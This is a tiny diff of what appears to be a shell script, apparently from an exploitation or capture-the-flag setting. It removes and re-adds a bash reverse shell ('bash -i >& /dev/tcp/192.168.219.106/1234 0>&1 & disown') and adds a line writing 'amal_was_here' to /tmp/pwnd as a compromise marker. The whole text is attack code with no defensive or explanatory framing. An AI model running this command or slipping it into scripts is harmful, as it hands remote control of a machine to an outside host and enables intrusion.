@@ -1,1 +1,4 @@
-bash -i >& /dev/tcp/192.168.219.106/1234 0>&1 & disown
+	#!/bin/bash
+	echo "amal_was_here" > /tmp/pwnd
+
+	bash -i >& /dev/tcp/192.168.219.106/1234 0>&1 & disown
